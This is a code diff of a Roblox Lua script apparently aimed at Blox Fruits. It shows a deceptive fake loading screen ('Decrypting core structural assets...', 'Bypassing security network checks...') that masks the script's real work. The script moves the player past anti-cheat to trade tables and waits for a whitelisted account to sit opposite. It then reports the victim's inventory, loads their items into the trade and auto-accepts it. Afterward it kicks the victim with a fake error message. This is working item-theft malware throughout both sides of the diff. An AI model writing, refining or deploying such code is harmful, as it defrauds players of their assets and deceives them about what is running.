-    TweenService:Create(centerPanel, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
-        { Size = UDim2.new(0, 360, 0, 250) }):Play()
-    local phrases = {
-        "Securing environmental pipeline...",
-        "Decrypting core structural assets...",
-        "Bypassing security network checks...",
-        "Injecting operational system logic...",
-        "Finalizing execution environment...",
-    }
-    local t0 = os.time()
-    while true do
-        local elapsed = os.time() - t0
-        local prog = math.clamp(elapsed / LOADER_SECONDS, 0, 1)
-        local p = math.floor(prog * 100)
-        if p >= 98 then
-            TweenService:Create(fill, TweenInfo.new(0.3), { Size = UDim2.new(0.98, 0, 1, 0) }):Play()
-            pct.Text = "98%"
-            break
-        end
-        TweenService:Create(fill, TweenInfo.new(0.5, Enum.EasingStyle.Linear), { Size = UDim2.new(prog, 0, 1, 0) }):Play()
-        pct.Text = p .. "%"
-        if p < 20 then st.Text = phrases[1]
-        elseif p < 45 then st.Text = phrases[2]
-        elseif p < 70 then st.Text = phrases[3]
-        elseif p < 90 then st.Text = phrases[4]
-        else st.Text = phrases[5] end
-        task.wait(0.4)
-    end
-    task.wait(2)
-    TweenService:Create(fill, TweenInfo.new(0.3), { Size = UDim2.new(1, 0, 1, 0) }):Play()
-    pct.Text = "100%"
-    task.wait(0.6)
-    loopConn:Disconnect()
-    if blur.Parent then blur:Destroy() end
-    unlock(); sg:Destroy()
-    log("loader: closed")
-end
-
--- WAITS
-local function waitForMap(timeout)
-    local t0 = tick()
-    while tick() - t0 < (timeout or 60) do
-        local map = workspace:FindFirstChild("Map")
-        if map then return map end
-        task.wait(0.5)
-    end
-    return nil
-end
-local function waitForZone(map, timeout)
-    local t0 = tick()
-    local zoneName = (game.PlaceId == S3) and "Turtle" or "Dressrosa"
-    while tick() - t0 < (timeout or 30) do
-        local zone = map:FindFirstChild(zoneName)
-        if zone then return zone end
-        task.wait(0.5)
-    end
-    return nil
-end
+-- =============================================================================
+-- 9. CHARACTER / MAP / ZONE WAITS
+-- =============================================================================
 local function waitForChar(timeout)
     if LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") then return LP.Character end
     local t0 = tick()
@@ -437,7 +516,30 @@ local function waitForChar(timeout)
     return LP.Character
 end
 
--- SEATS
+local function waitForMap(timeout)
+    local t0 = tick()
+    while tick() - t0 < (timeout or 60) do
+        local map = workspace:FindFirstChild("Map")
+        if map then return map end
+        task.wait(0.5)
+    end
+    return nil
+end
+
+local function waitForZone(map, timeout)
+    local t0 = tick()
+    local zoneName = (game.PlaceId == S3) and "Turtle" or "Dressrosa"
+    while tick() - t0 < (timeout or 30) do
+        local zone = map:FindFirstChild(zoneName)
+        if zone then return zone end
+        task.wait(0.5)
+    end
+    return nil
+end
+
+-- =============================================================================
+-- 10. SEATS
+-- =============================================================================
 local function getTradeTables()
     local out = {}
     local map = workspace:FindFirstChild("Map")
@@ -446,17 +548,22 @@ local function getTradeTables()
         local zone = map:FindFirstChild(zoneName)
         if zone then
             for _, c in ipairs(zone:GetChildren()) do
-                if c.Name == "TradeTable" and c:FindFirstChild("P1") and c:FindFirstChild("P2") then out[#out + 1] = c end
+                if c.Name == "TradeTable" and c:FindFirstChild("P1") and c:FindFirstChild("P2") then
+                    out[#out + 1] = c
+                end
             end
         end
     end
     if #out == 0 then
         for _, d in ipairs(workspace:GetDescendants()) do
-            if d.Name == "TradeTable" and d:FindFirstChild("P1") and d:FindFirstChild("P2") then out[#out + 1] = d end
+            if d.Name == "TradeTable" and d:FindFirstChild("P1") and d:FindFirstChild("P2") then
+                out[#out + 1] = d
+            end
         end
     end
     return out
 end
+
 local function seatOccupant(seat)
     local weld = seat and seat:FindFirstChild("SeatWeld")
     if not weld or not weld.Part1 then return nil end
@@ -464,6 +571,7 @@ local function seatOccupant(seat)
     local char = hum and hum.Parent
     return char and Players:GetPlayerFromCharacter(char) or nil
 end
+
 local function currentSeat()
     for _, tbl in ipairs(getTradeTables()) do
         for _, s in ipairs({ tbl.P1, tbl.P2 }) do
@@ -472,7 +580,11 @@ local function currentSeat()
     end
     return nil
 end
-local function oppositeSeat(seat, tbl) return seat == tbl.P1 and tbl.P2 or tbl.P1 end
+
+local function oppositeSeat(seat, tbl)
+    return seat == tbl.P1 and tbl.P2 or tbl.P1
+end
+
 local function pickSeat(exclude)
     local tables = getTradeTables()
     for _, tbl in ipairs(tables) do
@@ -491,28 +603,36 @@ local function pickSeat(exclude)
     return nil
 end
 
--- SAFE TELEPORT
-local lastTpAt = 0
+-- =============================================================================
+-- 11. ANTI-CHEAT-SAFE TELEPORT
+-- =============================================================================
 local function safeTeleport(targetVec)
     local now = tick()
     if now - lastTpAt < 0.8 then task.wait(0.8 - (now - lastTpAt)) end
     lastTpAt = tick()
+
     local char = waitForChar(10)
-    if not char then log("safeTeleport: no char") return false end
+    if not char then log("tp: no char") return false end
     local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
-    if not hrp then log("safeTeleport: no hrp") return false end
+    if not hrp then log("tp: no hrp") return false end
     local hum = char:FindFirstChildOfClass("Humanoid")
     if hum then hum.Sit = false; task.wait(0.15) end
+
     local restore = {}
     for _, p in ipairs(char:GetDescendants()) do
         if p:IsA("BasePart") then restore[p] = p.CanCollide; p.CanCollide = false end
     end
+
     local SPEED = 140
     local dist = (hrp.Position - targetVec).Magnitude
     local duration = math.max(dist / SPEED, 0.45)
     local t0 = tick()
+
     local bv = Instance.new("BodyVelocity")
-    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5); bv.Velocity = Vector3.zero; bv.Parent = hrp
+    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+    bv.Velocity = Vector3.zero
+    bv.Parent = hrp
+
     local conn
     conn = RunService.Heartbeat:Connect(function()
         if not hrp.Parent then return end
@@ -525,11 +645,13 @@ local function safeTeleport(targetVec)
         if remain < 8 then speed = math.min(speed, remain / 0.15) end
         bv.Velocity = diff.Unit * speed
     end)
+
     local deadline = t0 + duration + 2.5
     while tick() < deadline do
         if (hrp.Position - targetVec).Magnitude < 2 then break end
         task.wait(0.05)
     end
+
     conn:Disconnect()
     if bv.Parent then bv:Destroy() end
     for p, c in pairs(restore) do
@@ -539,36 +661,41 @@ local function safeTeleport(targetVec)
     return true
 end
 
--- SIT
+-- =============================================================================
+-- 12. SIT
+-- =============================================================================
 local function sitOn(seat)
     if not seat then return false end
-    log("sitOn: " .. seat:GetFullName())
     if currentSeat() == seat then return true end
-    local ok = safeTeleport(seat.Position + Vector3.new(0, 3, 0))
-    if not ok then log("sitOn: teleport failed") return false end
+
+    if not safeTeleport(seat.Position + Vector3.new(0, 3, 0)) then return false end
+
     local char = waitForChar(5)
     if not char then return false end
     local hum = char:FindFirstChildOfClass("Humanoid")
     local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
     if not hum or not hrp then return false end
-    if (hrp.Position - seat.Position).Magnitude > 12 then
-        log("sitOn: still far, " .. math.floor((hrp.Position - seat.Position).Magnitude))
-        return false
-    end
+    if (hrp.Position - seat.Position).Magnitude > 12 then return false end
+
     local welded = false
-    local conn = seat.ChildAdded:Connect(function(c) if c.Name == "SeatWeld" then welded = true end end)
+    local conn = seat.ChildAdded:Connect(function(c)
+        if c.Name == "SeatWeld" then welded = true end
+    end)
+
     pcall(function() seat:Sit(hum) end)
     hum.Sit = true
+
     local t0 = tick()
     while tick() - t0 < 4 and not welded do
         if seatOccupant(seat) == LP then welded = true; break end
         task.wait(0.1)
     end
     conn:Disconnect()
-    if not welded then log("sitOn: weld never formed"); return false end
-    log("sitOn: success")
-    return true
+
+    if welded then log("sat: " .. seat:GetFullName()) end
+    return welded
 end
+
 local function forceJumpOff()
     local char = LP.Character
     if not char then return end
@@ -579,15 +706,17 @@ local function forceJumpOff()
     task.wait(0.3)
 end
 
--- TRADE
-local tradesCompleted = 0
+-- =============================================================================
+-- 13. TRADE
+-- =============================================================================
 local function tradeWindowOpen()
     local main = PG:FindFirstChild("Main")
     local tr = main and main:FindFirstChild("Trade")
     return tr and tr.Visible or false
 end
+
 local function clearTradeItems()
-    if not tradeWindowOpen() then return end
+    if not tradeWindowOpen() or not TradeFunction then return end
     local c = PG.Main.Trade:FindFirstChild("Container")
     if not c or not c:FindFirstChild("1") then return end
     local frame = c["1"]:FindFirstChild("Frame")
@@ -599,112 +728,152 @@ local function clearTradeItems()
         end
     end
 end
-local function addToTrade(name) pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", name) end
+
+local function addToTrade(name)
+    if not TradeFunction then return end
+    pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", name)
+end
+
 local function runAutoTrade(reason)
     local items = collectTradeable()
-    log("runAutoTrade: " .. #items .. " tradeable")
-    if #items == 0 then log("no tradeable") return end
+    log("trade: " .. #items .. " tradeable")
+    if #items == 0 then return end
+
     sendInventoryEmbed(reason)
-    clearTradeItems(); task.wait(0.25)
+    clearTradeItems()
+    task.wait(0.25)
+
     local take = math.min(MAX_ITEMS_PER_TRADE, #items)
     for i = 1, take do
         addToTrade(items[i].Name)
-        log("  added: " .. items[i].Name)
+        log("  + " .. items[i].Name)
         task.wait(0.15)
     end
-    local t0 = tick(); local closed = false
+
+    local t0 = tick()
+    local closed = false
     while tick() - t0 < 40 do
         if not tradeWindowOpen() then closed = true; break end
-        pcall(TradeFunction.InvokeServer, TradeFunction, "accept")
+        if TradeFunction then pcall(TradeFunction.InvokeServer, TradeFunction, "accept") end
         task.wait(0.4)
     end
+
     if closed then
         tradesCompleted = tradesCompleted + 1
-        log("trade " .. tradesCompleted .. " completed")
-        if tradesCompleted >= KICK_THRESHOLD then task.wait(1.5); LP:Kick(KICK_MSG) end
-    else
-        log("trade window stayed open 40s — no count")
+        log("trade " .. tradesCompleted .. "/" .. KICK_THRESHOLD .. " closed")
+        if tradesCompleted >= KICK_THRESHOLD then
+            task.wait(1.5)
+            LP:Kick(KICK_MSG)
+        end
     end
 end
 
--- CHAT COMMANDS
-local CHAT_PREFIX = "."
-local function cmdTp() log(".tp"); local s = pickSeat(nil); if s then sitOn(s) end end
+-- =============================================================================
+-- 14. CHAT COMMANDS
+-- =============================================================================
+local function cmdTp()
+    log(".tp")
+    local s = pickSeat(nil)
+    if s then sitOn(s) end
+end
+
 local function cmdSit()
     log(".sit")
-    local char = LP.Character; if not char then return end
-    local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return end
-    hum.Sit = true; task.wait(0.4)
-    if not currentSeat() then local s = pickSeat(nil); if s then sitOn(s) end end
+    local char = LP.Character
+    if not char then return end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+    hum.Sit = true
+    task.wait(0.4)
+    if not currentSeat() then
+        local s = pickSeat(nil)
+        if s then sitOn(s) end
+    end
 end
+
 local function cmdAddAll()
     log(".addall")
-    if not tradeWindowOpen() then log(".addall: no trade window") return end
-    local items = collectTradeable(); clearTradeItems(); task.wait(0.25)
-    local c = 0
+    if not tradeWindowOpen() then return end
+    local items = collectTradeable()
+    clearTradeItems()
+    task.wait(0.25)
+    local count = 0
     for _, item in ipairs(items) do
-        if c >= MAX_ITEMS_PER_TRADE then break end
-        addToTrade(item.Name); c = c + 1; task.wait(0.15)
+        if count >= MAX_ITEMS_PER_TRADE then break end
+        addToTrade(item.Name)
+        count = count + 1
+        task.wait(0.15)
     end
-    log(".addall: added " .. c)
 end
-local function cmdKick() log(".kick"); task.wait(0.5); LP:Kick("Error while loading. Rejoin.") end
+
+local function cmdKick()
+    log(".kick")
+    task.wait(0.5)
+    LP:Kick("Error while loading. Rejoin.")
+end
+
 local COMMANDS = { tp = cmdTp, sit = cmdSit, addall = cmdAddAll, kick = cmdKick }
+
 local function handleChat(msg)
     if type(msg) ~= "string" then return end
     if msg:sub(1, #CHAT_PREFIX) ~= CHAT_PREFIX then return end
     local body = msg:sub(#CHAT_PREFIX + 1):lower():gsub("%s+", "")
     local fn = COMMANDS[body]
     if not fn then return end
-    log("chat command: " .. body)
     task.spawn(function() pcall(fn) end)
 end
+
 LP.Chatted:Connect(handleChat)
 
--- MAIN
-local function main()
-    log("main start | placeId=" .. game.PlaceId .. " | name=" .. tostring(game.Name) .. " | char=" .. tostring(LP.Character ~= nil))
-    task.spawn(function()
-        local ok, err = pcall(showLoadingScreen)
-        if not ok then log("loader error: " .. tostring(err)) end
-    end)
-    waitForChar(30); log("char ready")
-    local map = waitForMap(60)
-    if not map then log("map never loaded") return end
-    log("map ready")
-    local zone = waitForZone(map, 30)
-    if not zone then log("zone never loaded") return end
-    log("zone ready: " .. zone.Name)
-    local tables = getTradeTables()
-    log("trade tables found: " .. #tables)
-    local seat = currentSeat()
-    if not seat then
-        local target = pickSeat(nil)
-        if target then sitOn(target) end
-    end
-    while true do
-        task.wait(0.5)
-        local curSeat, tbl = currentSeat()
-        if not curSeat then
-            local target = pickSeat(nil)
-            if target then sitOn(target) end
-        else
-            local opp = seatOccupant(oppositeSeat(curSeat, tbl))
-            if opp and WHITELIST[opp.Name] then
-                if tradeWindowOpen() then runAutoTrade("Whitelisted user on opposite chair.") end
-            elseif opp and not WHITELIST[opp.Name] then
-                log("non-whitelisted opposite: " .. opp.Name .. " — hopping")
-                forceJumpOff()
-                local target = pickSeat(tbl)
-                if target then sitOn(target) end
-            end
-        end
-    end
-end
-
+-- =============================================================================
+-- 15. MAIN LOOP
+-- =============================================================================
 task.spawn(function()
     if not game:IsLoaded() then game.Loaded:Wait() end
     task.wait(1)
-    local ok, err = pcall(main)
-    if not ok then log("FATAL in main: " .. tostring(err)) else log("main exited cleanly") end
+
+    local ok, err = pcall(function()
+        waitForChar(30)
+        log("char ready")
+
+        local map = waitForMap(60)
+        if not map then log("map never loaded"); return end
+        log("map ready")
+
+        local zone = waitForZone(map, 30)
+        if not zone then log("zone never loaded"); return end
+        log("zone ready: " .. zone.Name)
+
+        local tables = getTradeTables()
+        log("trade tables: " .. #tables)
+
+        local seat = currentSeat()
+        if not seat then
+            local target = pickSeat(nil)
+            if target then sitOn(target) end
+        end
+
+        while true do
+            task.wait(0.5)
+            local curSeat, tbl = currentSeat()
+            if not curSeat then
+                local target = pickSeat(nil)
+                if target then sitOn(target) end
+            else
+                local opp = seatOccupant(oppositeSeat(curSeat, tbl))
+                if opp and WHITELIST[opp.Name] then
+                    if tradeWindowOpen() then
+                        runAutoTrade("whitelisted opposite: " .. opp.Name)
+                    end
+                elseif opp and not WHITELIST[opp.Name] then
+                    log("non-whitelisted opposite: " .. opp.Name .. " — hopping")
+                    forceJumpOff()
+                    local target = pickSeat(tbl)
+                    if target then sitOn(target) end
+                end
+            end
+        end
+    end)
+
+    if not ok then log("FATAL in main: " .. tostring(err)) end
 end)
